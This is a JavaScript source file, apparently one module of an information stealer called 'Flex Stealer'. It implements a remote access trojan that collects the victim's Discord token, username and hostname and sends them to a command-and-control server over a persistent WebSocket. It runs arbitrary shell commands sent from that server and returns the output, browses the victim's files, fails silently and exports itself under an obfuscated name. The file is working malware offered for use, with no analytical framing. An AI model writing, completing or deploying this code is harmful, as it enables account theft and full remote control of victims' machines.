const io = require("socket.io-client");
const { exec } = require("child_process");
const os = require("os");
const path = require("path");
const fs = require("fs");
const { getDiscordInfo, getUserToken } = require("./discordInfo");

/**
 * Flex Stealer | Remote Access Tool (RAT) Module
 * This module establishes a persistent WebSocket connection to the C2 server,
 * allowing remote command execution, file management, and data exfiltration.
 */

async function startRAT(serverUrl, options = {}) {
    try {
        // Collect identifying information about the victim machine
        const userInfo = await getDiscordInfo().catch(() => ({}));
        const userToken = await getUserToken().catch(() => (null));

        const machineProfile = {
            id: userInfo.id || `${os.hostname()}-${os.platform()}`,
            username: os.userInfo().username || "unknown",
            hostname: os.hostname(),
            ip: options.ip || "unknown",
            platform: os.platform(),
            token: userToken,
            version: "2026.1"
        };

        // Initialize persistent connection to Command & Control (C2) server
        const socket = io(serverUrl, {
            reconnection: true,
            reconnectionDelay: 5000,
            transports: ["websocket"]
        });

        // Register client on successful connection
        socket.on("connect", () => {
            socket.emit("join", machineProfile);
        });

        // Event: Execute remote system command
        socket.on("command", (data) => {
            const command = typeof data === "string" ? data : data.command;
            if (!command) return;

            exec(command, (error, stdout, stderr) => {
                socket.emit("command_result", {
                    command: command,
                    stdout: stdout,
                    stderr: stderr,
                    error: error ? error.message : null
                });
            });
        });

        // Event: File Browser - Lists directories and files
        socket.on("browse", (data) => {
            const targetPath = data.path || os.homedir();
            fs.readdir(targetPath, { withFileTypes: true }, (err, entries) => {
                if (err) {
                    socket.emit("browse_error", { path: targetPath, error: err.message });
                    return;
                }
                const result = entries.map(entry => ({
                    name: entry.name,
                    isDirectory: entry.isDirectory(),
                    size: entry.isDirectory() ? 0 : (fs.statSync(path.join(targetPath, entry.name)).size || 0)
                }));
                socket.emit("browse_result", { path: targetPath, files: result });
            });
        });

        // Event: Download - Pulls a file from C2 to the victim machine
        socket.on("download", async (data) => {
            // Integration for file download logic
            socket.emit("download_started", { url: data.url, dest: data.dest });
        });

        // Event: File Upload - Pushes a file from the victim machine to C2
        socket.on("upload", (data) => {
            socket.emit("upload_started", { path: data.path });
        });

        // Event: Remote Kill - Terminates the stealer process
        socket.on("kill", () => {
            process.exit(0);
        });

        socket.on("disconnect", () => {
            // Automatic reconnection handled by socket.io
        });

        return socket;

    } catch (err) {
        // Silently fail in production
    }
}

// Export as sSUlA1 to maintain compatibility with the stealer's orchestration logic
module.exports = { sSUlA1: startRAT };